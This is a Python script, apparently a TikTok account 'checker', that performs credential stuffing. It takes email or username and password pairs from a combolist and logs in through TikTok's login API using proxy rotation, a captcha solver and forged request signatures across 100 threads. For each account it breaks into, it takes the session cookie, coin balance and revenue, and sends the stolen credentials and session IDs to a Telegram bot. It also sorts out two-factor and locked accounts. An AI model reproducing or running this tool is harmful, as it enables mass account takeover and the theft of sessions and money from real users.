import time, string, secrets, hashlib, requests, datetime, re, os, threading, random, json,binascii, uuid, time,uuid
try:import httpx, requests, user_agent, cv2, asyncio, aiohttp
except:os.system("pip install httpx pycryptodome opencv-python requests user_agent asyncio aiohttp")
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry 
from time import sleep
from signer.main import CaptchaSolver
from signer.capture import TikTok_Info, send_discord_webhook 
from signer.sign import sign
import concurrent.futures
from user_agent import generate_user_agent
import secrets
import uuid,binascii
try:
    import MedoSigner
except:
    os.system("pip install pycryptodome MedoSigner")
from MedoSigner import Argus, Gorgon, Ladon, md5
import re, os, requests, random, binascii, uuid, time, secrets, string
from os import urandom
from urllib.parse import urlencode
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
a1 = '\x1b[1;35m'  # بنفسجي
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[1;36m'  # سماوي
RED = '\x1b[1;31m'  # أحمر
ORANGE = '\x1b[38;5;208m'  # برتقالي
W = '\x1b[0m'  # ابيض
def clear():
    __import__("os").system("cls" if __import__("os").name == "nt" else "clear")
    rndm= __import__("random").choice([a1,a2,a3,a4,a5])
    print(f"{a2}╭───────────────────────────────────────────────────────────╮")


    print(f"""{a2}│\t  {rndm}██████╗░███████╗███╗░░░███   ╗░█████╗░ \t    
{a2}│{rndm}\t ██╔══██╗██╔════╝████╗░████  ║██╔══██╗\t
{a2}│{rndm}\t ██║░░██║█████╗░░██╔████╔██ ║██║░░██║   \t
{a2}│{rndm}\t ██║░░██║██╔══╝░░██║╚██╔╝██  ║██║░░██║  \t
{a2}│{rndm}\t ██████╔╝███████╗██║░╚═╝░██ ║╚█████╔╝   \t
{a2}│{rndm}\t ╚═════╝░╚══════╝╚═╝░░░░░╚═    ╝░╚════╝░   \t""")
    print(f"{a2}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫")
    print(f"{a2}┃{a3} 🫧  {a4}Tool:Compo{a2} ┃{a4} Dev: {a3}⏤͟͞ 𝗗𝗘𝗠𝗢🇮🇶  {a2} ┃{a4} Tle: {a3}@S_44_F{a2} ┃Ch: {a3}@D_EM0{a2} ┃")


    print(f"{a5}╰───────────────────────────────────────────────────────────╮{W}")    



class tiktok:
  def __init__(self):
    self.hits=0
    self.secured=0
    self.tofa=0
    self.bad=0
    self.idk=0
    self.checked=0
    self.lines=0
    self.rate_limited=0
    self.coins=0
    self.devices = []
    self.proxy = []
    self.accounts = []
    self.retry=0
    self.done_solve_captcha = 0
    self.retry_account_number = {}
    self.device_usage = {}
    self.max_retry_number = 3
    self.captcha_3D=0
    self.workers=100
    self.telegram='https://api.telegram.org/bot'
    self.bot_token=input('token : ')
    self.chat_id=input('id : ')
    os.system('cls' if os.name == 'nt' else 'clear')
    threading.Thread(target=self.see,args=()).start()
    threading.Thread(target=self.proxy_update,args=()).start()
    self.read_files()
    self.accounts = set(self.accounts)
    self.lines=len(self.accounts)
    with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as executor:
      futures = []
      for account in self.accounts:
          future = executor.submit(self.login, account.split(':')[0],account.split(':')[1])
          futures.append(future)
      for future in concurrent.futures.as_completed(futures):
          future.result()
  def captcha_solve(self):
      try:
        selected_device = None
        device_data = None        
        for _ in range(5):
            try:
                proxy = random.choice(self.proxy)
                if not self.devices:
                    break                    
                raw_device = random.choice(self.devices)
                device_parts = raw_device.split(':')
                if len(device_parts) < 6:
                    continue                
                device_id = device_parts[1]                
                if device_id in self.device_usage:
                    if self.device_usage[device_id] >= 3:  
                        continue
                else:
                    captcha_result = CaptchaSolver(iid=device_parts[0],did=device_id,             device_type=device_parts[2],                  device_brand=device_parts[3],proxy={"http": f'http://{proxy}',"https": f'http://{proxy}'},).start()                    
                    if not captcha_result or captcha_result.get("code") != 200:
                        continue
                    self.device_usage[device_id] = 0                
                selected_device = raw_device
                self.device_usage[device_id] += 1                
                os_version = f"{random.randint(7, 33)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                device_data = {
                    'iid': device_parts[0],
                    'did': device_id,
                    'device_type': device_parts[2],
                    'device_brand': device_parts[3],
                    'os_version': os_version,
                    'cdid': device_parts[5],
                    'openudid': device_parts[4],
                }
                break                    
            except Exception as e:
                continue
        if not selected_device or not device_data:
            return 
        self.done_solve_captcha += 1
        return device_data['did']               
      except Exception as e:
      	pass  
  def lockup_username(self,username):
    try:
        payload = {'mix_mode': "1",'username': "".join([hex(ord(_) ^ 5)[2:] for _ in username]) }
        params = {'_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",'ab_version': '37.8.5','ac': 'WIFI','ac2': 'wifi','aid': '1233','app_language': 'ar','app_name': 'musical_ly','app_type': 'normal','build_number': '37.8.5','carrier_region': 'US','carrier_region_v2': '460','cdid': str(uuid.uuid4()),'channel': 'googleplay','cronet_version': '75b93580_2024-11-28','device_brand': 'rockchip','device_id': str(random.randint(1, 10**19)),'device_platform': 'android','device_type': 'rk3588s_q','dpi': '320','fixed_mix_mode': '1','host_abi': 'arm64-v8a','iid': str(random.randint(1, 10**19)),'is_pad': '0','language': 'ar','last_install_time': '1745162892','locale': 'ar','manifest_version_code': '2023708050','mix_mode': '1','op_region': 'US','openudid': binascii.hexlify(urandom(8)).decode(),'os': 'android','os_api': '29','os_version': '10','region': 'IQ','request_tag_from': 'h5','resolution': '720%2A1280','rrb': '%7B%7D','scene': '4','ssmix': 'a','support_webview': '1','sys_region': 'IQ','timezone_name': 'Europe%2FAmsterdam','timezone_offset': '3600','ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),'ttnet_version': '4.2.210.6-tiktok','uoo': '0','update_version_code': '2023708050','use_store_region_cookie': '1','version_code': '370805','version_name': '37.8.5','app_version': '32.9.5'}
        x_log = sign(urlencode(params), urlencode(payload), "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
        headers = {'User-Agent': "com.zhiliaoapp.musically.go/350302 (Linux; U; Android 12; ar_IQ; SO-51A; Build/58.2.B.0.520;tt-ok/3.12.13.21-ul)",}
        headers.update(x_log)
        proxy = random.choice(self.proxy)
        response = requests.post("https://api16-normal-c-alisg.tiktokv.com/passport/find_account/tiktok_username/",params=params,data=payload,headers=headers,proxies={'http': f'http://{proxy}','https': f'http://{proxy}'})
        token = response.json()["data"]["token"]
        params.update({'not_login_ticket': token})
        x_log = sign(urlencode(params), urlencode(payload), "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
        headers.update(x_log)
        proxy = random.choice(self.proxy)
        response = requests.post("https://api16-normal-c-alisg.ttapis.com/passport/auth/available_ways/", params=params,proxies={'http': f'http://{proxy}','https': f'http://{proxy}'}).json()['data']
        has_email=response['has_email']
        has_mobile=response['has_mobile']
        has_passkey=response['has_passkey']
        has_oauth=response['has_oauth']
        if has_oauth == True:
            oauth_platforms=''
            for platform in response['oauth_platforms']:
                if len(response['oauth_platforms']) == 1:
                    oauth_platforms+=platform
                    break
                else:
                    oauth_platforms+=platform+','
        else:
            oauth_platforms=''
        return {'has_email':has_email,'has_mobile':has_mobile,'has_passkey':has_passkey,'oauth_platforms':oauth_platforms}
    except Exception as e:
        return {'has_email':'','has_mobile':'','has_passkey':'','oauth_platforms':''}
  def coin_number(self,sessionid):
    coins, revenue = 0, 0
    try:
        response = requests.get("https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&device_platform=web_pc", headers={'Cookie': f'sessionid={sessionid}','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'})
        if response.status_code == 200:
            data = response.json()
            coins = data.get('data', {}).get('coins', 0)
            revenue = data.get('data', {}).get('exchange', {}).get('revenue', 0) / 100
    except requests.exceptions.RequestException as e:
        print(f"Error fetching coins: {e}")
    return coins, revenue
  def account_info(self, username):
        id = None
        level = 0
        done = False
        nickname = followers = following = likes = videos = None
        status_account = date_create = region = flag = None
        try:
            response = requests.get(f'https://www.tiktok.com/@{username}',headers={"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36"},timeout=3).text
            
            data = response.split('"userInfo":{"user":{')[1].split("</sc")[0]
            id = data.split('"id":"')[1].split('"')[0]
            nickname = data.split('"nickname":"')[1].split('"')[0]
            following = data.split('"followingCount":')[1].split(',')[0]
            followers = data.split('"followerCount":')[1].split(',')[0]
            likes = data.split('"heart":')[1].split(',')[0]
            videos = data.split('"videoCount":')[1].split(',')[0]
            status_account = 'True' if "true" in data.split('"privateAccount":')[1].split(',')[0] else 'False'
            date_create = str(datetime.datetime.fromtimestamp(int(data.split('"createTime":')[1].split(',')[0]))).split(' ')[0].split('-')
            
            try:
                region = data.split('"region":"')[1].split('"')[0]
            except:
                region = "Known"
            
            try:
                flag = ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in region.upper())
            except:
                flag = "🏴‍☠️"
            
            done = True
        except:
            pass
        if not done:
            try:
                token = requests.post(
                    "https://www.googleapis.com/identitytoolkit/v3/relyingparty/signupNewUser",
                    params={'key': "AIzaSyAZqmylIOE4fQmf0pemugc2iBH33rSeMkg"},
                    data=json.dumps({"returnSecureToken": True}),
                    headers={'User-Agent': "okhttp/3.12.1",'Accept-Encoding': "gzip",'Content-Type': "application/json",'x-client-version': "ReactNative/JsCore/7.8.1/FirebaseCore-web"},timeout=3).json().get("idToken")
                if token:
                    r = requests.post("https://us-central1-tikfans-prod-a3557.cloudfunctions.net/getTikTokUserInfo",data=json.dumps({"data": {"username": username}}),headers={'User-Agent': "okhttp/3.12.1",'Content-Type': "application/json",'authorization': f"Bearer {token}"},timeout=3).json().get("result")
                    
                    if r:
                        id = r.get('userId')
                        followers = r.get('fans')
                        following = r.get('following')
                        likes = r.get('heart')
                        nickname = r.get('nickName')
                        videos = r.get('video')
                        status_account = "Yes" if r.get("isSecret") else "No"
                        date_create = datetime.datetime.now().strftime('%d/%m/%Y')
                        region = "Known"
                        flag = "🏴‍☠️"
                        done = True
            except:
                pass
        if id:
            iid = random.randint(1, int(1e19))
            did = random.randint(1, int(1e19))
            oudid = binascii.hexlify(os.urandom(8)).decode()
            rt = -round(random.uniform(1.2, 1.6) * 1e8)
            ts = -round(random.uniform(1.2, 1.6) * 1e8)
            cdid = str(uuid.uuid4())
            sec = "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9))
            p = f"request_from=profile_card_v2&request_from_scene=1&target_uid={id}&iid={iid}&device_id={did}&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid={oudid}&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket={rt}4632&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts={ts}&cdid={cdid}&webcast_sdk_version=2920&webcast_language=ar&webcast_locale=ar_IQ"
            t = int(time.time())
            h = {'User-Agent': "com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)"}
            h.update(Gorgon(p, t, '', None).get_value())
            h["x-ladon"] = Ladon.encrypt(t, 1611921764, 1233)
            h["x-argus"] = Argus.get_sign(p, md5(b'').hexdigest(), t, platform=19, aid=1233, license_id=1611921764, sec_device_id=sec, sdk_version="2.3.1.i18n", sdk_version_int=2)
            
            try:
                try:
                    d = requests.get(f"https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?{p}",headers=h,timeout=10).text
                    m = re.search(r'"default_pattern":"(.*?)"', d)
                    level = int(m.group(1).split('المستوى رقم ')[1])
                except:
                    if self.proxy:
                        proxy = random.choice(self.proxy)
                        d = requests.get(f"https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?{p}",headers=h,proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},timeout=3).text
                        m = re.search(r'"default_pattern":"(.*?)"', d)
                        level = int(m.group(1).split('المستوى رقم ')[1])
            except:
                level = 0
        return {'nickname': nickname,'followers': followers,'likes': likes,'videos': videos,'status_account': status_account,'date_create': date_create,'id': id,'following': following,'region': region,'flag': flag,'level': level}
  def check_email_on_tiktok(self,email):
    return  True
  def xor(self,value: str) -> str:
    return "".join([hex(ord(_) ^ 5)[2:] for _ in value])
  def login(self,username_or_email,password):
    while True:
      try:
        if '@' in username_or_email and self.check_email_on_tiktok(username_or_email) == False:
          self.bad+=1
          self.checked+=1
          return
        device_id = self.captcha_solve()
        csrf_token = secrets.token_hex(10)
        params = f"device_id={device_id}&aid=8311&account_sdk_source=web&sdk_version=2.1.9&verifyFp=verify_mdp0mlok_KiA9fJfZ_BtmW_42xa_94KQ_QvkW1FtMze9Y&sign=e15f483a99d1b0ae87e84508ccd223698ab814b39865277c650c153ca1f4a971&qs=6466666a706b715a76616e5a766a707766602964c61296160736c66605a6c612976616e5a736077766c6a6b297360776c637c4375"         
        url =f"https://api2-16-h2.musical.ly/passport/web/user/login/?{params}" 
        data = f"mix_mode=1&username={self.xor(username_or_email)}&password={self.xor(password)}&fp=verify_{device_id}&verifyFp=verify_{device_id}&device_id={device_id}&language=en&multi_login=1&fixed_mix_mode=1" 
        headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"passport_csrf_token={csrf_token}; passport_csrf_token_default={csrf_token}",
        "X-Tt-Passport-Csrf-Token": csrf_token,
        "referer": "https://www.tiktok.com/ucenter_web/live_studio/login",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) TikTokLIVEStudio/0.89.0 Chrome/108.0.5359.215 Electron/22.3.18-tt.11.release.main.48 TTElectron/22.3.18-tt.11.release.main.48 Safari/537.36",
        "x-argus": 'x',
        "x-khronos": 'x',
        "x-ladon": 'x',
    }   
        while True:
            try:
                proxy = random.choice(self.proxy)
                response = requests.post(url, params=params, headers=headers, data=data, proxies={"http": f'http://{proxy}',"https": f'http://{proxy}'}, timeout=15);break     
            except:''
        json_response = response.json()
       # print(json_response)
        if "data" in json_response and "session_key" in json_response["data"]:
            self.hits+=1
            self.checked+=1
            clear()
            username = json_response['data']['username']
            sessionid = (response.cookies.get_dict().get("sessionid"))
            account_info = self.account_info(username)
            lockup = self.lockup_username(username)
            coins, revenue = self.coin_number(sessionid)
            self.coins += coins
            info = f"""
⏱ • TIKTOK ACCOUNT INFO •
📌 User: {username_or_email}
📌 Pass: {password}
📌 Followers: {account_info["followers"]}
📌 Following: {account_info["following"]}
📌 Likes: {account_info["likes"]}
📌 Name: {account_info["nickname"]}
📌 Videos: {account_info["videos"]}
📌 Private: {account_info["status_account"]}
📌 Created: {account_info["date_create"]}
📌 ID: {account_info["id"]}
📌 Country: {account_info["region"]} {account_info["flag"]}
📌 Level: {account_info["level"]}
📌 Coins: {coins}
📌 Revenue: ${revenue:.2f}
📌 SessionID: {sessionid}
📌 Email: {lockup["has_email"]}
📌 Mobile: {lockup["has_mobile"]}
📌 Passkey: {lockup["has_passkey"]}
⏱ • TIKTOK ACCOUNT INFO •
👨💻 DEV: @S_44_F | @D_EM0
"""
            requests.get(f'{self.telegram}{self.bot_token}/sendMessage?chat_id={self.chat_id}&text={info}')
            with open('results/hits.txt','a',encoding='utf-8') as f:
              f.write(f'{info}\n')
            return
        elif "2-step" in response.text:
            self.tofa+=1
            self.checked+=1
            if '@' not in username_or_email:
              lockup = self.lockup_username(username_or_email)
              account_info = self.account_info(username_or_email)
              info = f"""
🔐 • 2FA ACCOUNT INFO •
❄ User: {username_or_email}
❄ Pass: {password}
❄ Followers: {account_info["followers"]}
❄ Following: {account_info["following"]}
❄ Likes: {account_info["likes"]}
❄ Level: {account_info["level"]}
❄ Videos: {account_info["videos"]}
❄ Status: {account_info["status_account"]}
❄ Created: {account_info["date_create"]}
❄ ID: {account_info["id"]}
❄ Country: {account_info["region"]} {account_info["flag"]}
❄ Email: {lockup["has_email"]}
❄ Mobile: {lockup["has_mobile"]}
❄ Passkey: {lockup["has_passkey"]}
🔐 • 2FA ACCOUNT INFO •
👨‍💻 DEV: @S_44_F | @D_EM0
"""
            else:
              info = f'2fa | {username_or_email}:{password}'
            requests.get(f'{self.telegram}{self.bot_token}/sendMessage?chat_id={self.chat_id}&text={info}')
            with open('results/2fa.txt','a',encoding='utf-8') as f:
              f.write(f'{info}\n')
            return
        elif "verify_ticket" in response.text:
            self.secured+=1
            self.checked+=1
            if '@' not in username_or_email:
              lockup = self.lockup_username(username_or_email)
              account_info = self.account_info(username_or_email)
              info = f"""
🔒 • SECURED ACCOUNT INFO •
❄ User: {username_or_email}
❄ Pass: {password}
❄ Followers: {account_info["followers"]}
❄ Following: {account_info["following"]}
❄ Likes: {account_info["likes"]}
❄ Level: {account_info["level"]}
❄ Videos: {account_info["videos"]}
❄ Status: {account_info["status_account"]}
❄ Created: {account_info["date_create"]}
❄ ID: {account_info["id"]}
❄ Country: {account_info["region"]} {account_info["flag"]}
❄ Email: {lockup["has_email"]}
❄ Mobile: {lockup["has_mobile"]}
❄ Passkey: {lockup["has_passkey"]}
🔒 • SECURED ACCOUNT INFO •
👨‍💻 DEV: @S_44_F | @D_EM0
"""
              with open('results/secured_with_information.txt','a',encoding='utf-8') as f:
                  f.write(f'{info}\n\n')
            else:
              info = f'secured | {username_or_email}:{password}'
            requests.get(f'{self.telegram}{self.bot_token}/sendMessage?chat_id={self.chat_id}&text={info}')
            with open('results/secured.txt','a',encoding='utf-8') as f:
              f.write(f'{username_or_email}:{password}\n')
            return
        elif "Username or password doesn't match" in response.text or "Incorrect account or password" in response.text or "Account doesn't exist" in response.text:
            self.bad+=1
            self.checked+=1
            return
        elif "verify_center_decision_conf" in response.text:
            self.captcha_3D+=1
            self.checked+=1
            with open('results/3d_captcha.txt','a') as f:
              f.write(f'{username_or_email}:{password}\n')
            return 
        elif "Maximum number of attempts reached. Try again later" in response.text:
          self.retry+=1
          if username_or_email+':'+password in self.retry_account_number:
            retry_num=self.retry_account_number[username_or_email+':'+password]
            if retry_num>=self.max_retry_number:
              self.rate_limited+=1
              self.checked+=1
              self.retry-=1
              with open('results/rate_limited.txt','a') as f:
                f.write(f'{username_or_email}:{password}\n')
              return
            else:
              self.retry_account_number[username_or_email+':'+password]=retry_num+1
              time.sleep(30)
              self.retry-=1
          else:
            self.retry_account_number[username_or_email+':'+password]=1
            time.sleep(30)
            self.retry-=1
        else:
          self.idk+=1
          self.checked+=1
          with open('results/idk.txt','a') as f:
            f.write(f'{username_or_email}:{password}:{json_response}\n')
          return
      except:''
  def see(self):
    while True:
        print(f"\r\033[92mhits:{self.hits}\033[0m | \033[93msecured:{self.secured}\033[0m | \033[96m2fa:{self.tofa}\033[0m | \033[91mbads:{self.bad}\033[0m | \033[93mcoins:{self.coins}\033[0m | \033[95mneed retry:{self.retry}\033[0m | \033[94mrate limited:{self.rate_limited}\033[0m | \033[97m3d captcha:{self.captcha_3D}\033[0m | \033[97m{self.checked}/{self.lines}\033[0m", end='')
        time.sleep(0.3)
  def proxy_update(self):
    while True:
      try:
          qqq=[]
          with open("data/proxy.txt", encoding="utf-8", errors='ignore') as f:
              for porx in f.readlines():
                  if '@' in porx.strip():
                      qqq.append(porx.strip())
              self.proxy=qqq
              time.sleep(5)
      except:''
  def read_files(self):
    try:
      with open("data/combolist.txt", encoding="utf-8", errors='ignore') as f:
        for account in f.readlines():
          if ':' in account.strip():
            self.lines += 1
            self.accounts.append(account.strip())
    except:
      exit('[-] combolist.txt not found')
    try:
      with open("data/devices.txt", "r", encoding="utf-8") as f:
        self.devices = f.read().splitlines()
    except:
      exit('[-] devices.txt not found')
clear()
print(f"{a2}【 {a3}●{a2} 】{a3}Choose an Option:")
print(f"{a2}【 {a5}1{a2} 】{a3}Run TikTok Checker (Email:Pass | User:Pass)")
print(f"{a2}【 {a5}2{a2} 】{a3}Extract Usernames & Generate Combo")
print(f"{a2}【 {a5}3{a2} 】{a3}Add Symbols to Combo List")
print(f"{a5}╰──────────────────────────────────────────────────────╯{W}")
mode = input(f"{a2}【 {a5}●{a2} 】{a3}Select Option (1/2/3): {W}").strip()
if mode == "1":
    tiktok()
if mode == "2":
    from COMPO_USER_PASSWORD import run
    run()
    exit()
if mode == "3":
    if not os.path.exists("data/combolist.txt"):
        print(f"{a3}[!] File 'combolist.txt' not found{W}")
        exit()
    print(f"{a2}【 {a3}●{a2} 】{a3}Example {a2}[{a3}@ | # | $ | * | ! | ?{a2}] {W}")
    symbol = input(f"{a2}【 {a3}●{a2} 】{a3}Enter one symbol only: {W}").strip()
    if len(symbol) != 1:
        print(f"{a3}[!] Please enter only one symbol{W}")
        exit()
    with open("data/combolist.txt", "r", encoding="utf-8") as f:
        lines = f.readlines()
    with open("data/combolist.txt", "w", encoding="utf-8") as f:
        for line in lines:
            f.write(line.strip() + symbol + "\n")
    print(f"{a2}【 {a3}✓{a2} 】{a3}Symbol added successfully to all lines{W}")
else:exit(f"{a3}[!] Please enter correct number{W}")
